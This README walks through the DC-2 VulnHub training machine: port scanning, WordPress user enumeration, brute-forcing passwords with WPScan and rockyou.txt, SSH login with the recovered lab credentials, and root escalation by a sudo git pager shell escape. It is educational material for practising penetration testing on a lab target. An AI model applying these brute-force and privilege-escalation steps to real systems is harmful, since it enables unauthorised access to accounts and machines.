# dc-2-lab-walkthrough

A complete walkthrough of the DC-2 VulnHub machine including enumeration, WordPress scanning, SSH access, and privilege escalation.

---

## 🔧 Tools Used
- Nmap
- WPScan
- SSH
- Git

---

## 📌 Machine Information
- Name: DC-2
- Platform: VulnHub
- Difficulty: Beginner / Intermediate

---

## 🚀 Walkthrough Steps

### 1. Find Target IP

```bash
netdiscover
```

---

### 2. Scan Open Ports

```bash
nmap -sC -sV -A TARGET-IP
```

Open Ports:
- 22 (SSH)
- 80 (HTTP)

---

### 3. Enumerate WordPress

```bash
wpscan --url http://TARGET-IP -e u
```

Users Found:
- admin
- jerry
- tom

---

### 4. Bruteforce Credentials

```bash
wpscan --url http://TARGET-IP -U users.txt -P /usr/share/wordlists/rockyou.txt
```

Credentials:
- jerry : adipiscing
- tom : parturient

---

### 5. SSH Access

```bash
ssh tom@TARGET-IP
```

---

### 6. Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Exploit Git:

```bash
sudo git -p help config
```

Inside pager:

```bash
!/bin/bash
```

Check root:

```bash
whoami
```

Output:

```text
root
```

---

### 7. Capture Final Flag

```bash
cd /root
ls
cat final-flag.txt
```

---

## 📷 Screenshots
The detailed PDF walkthrough is available in this repository.dc-2 lab walkthrough.pdf

---

## 🎯 Learning Outcomes
- WordPress Enumeration
- WPScan Usage
- SSH Access
- Linux Privilege Escalation
- Basic Penetration Testing

---

## 👨‍💻 Author
Akshay Shinde
